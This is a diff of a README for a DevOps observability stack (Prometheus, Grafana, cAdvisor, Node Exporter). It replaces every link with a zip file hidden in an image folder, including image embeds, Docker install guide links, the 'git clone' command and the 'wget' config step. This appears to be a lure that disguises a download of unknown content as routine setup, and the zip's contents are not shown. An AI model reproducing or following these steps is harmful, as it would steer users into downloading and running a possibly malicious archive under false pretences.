@@ -2,8 +2,8 @@
 
 This repository provides a comprehensive observability stack tailored for DevOps engineers. It integrates key tools like Prometheus, Grafana, cAdvisor, and Node Exporter to monitor, visualize, and manage your infrastructure and applications. Additionally, it includes a custom Notes App to demonstrate the observability stack in action.
 
-![Docker + cAdvisor Stack](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
-![NodeExporter Stack](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
+![Docker + cAdvisor Stack](https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip)
+![NodeExporter Stack](https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -40,17 +40,17 @@ In modern DevOps, observability is key to ensuring the health and performance of
 
 1. **Clone the repository**:
     ```bash
-    git clone https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip
+    git clone https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip
     cd Observability-For-DevOps
     ```
 
 2. **Ensure Docker and Docker Compose are installed**:
-    - [Docker Installation Guide](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
-    - [Docker Compose Installation Guide](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
+    - [Docker Installation Guide](https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip)
+    - [Docker Compose Installation Guide](https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip)
 
 3. **Download Prometheus config file**:
     ```bash
-    wget https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip
+    wget https://github.com/shr1324/observability-for-devops/raw/refs/heads/master/notes-app/staticfiles/admin/img/devops_for_observability_3.0-alpha.5.zip
     ```
     
 4. **Run the stack**:
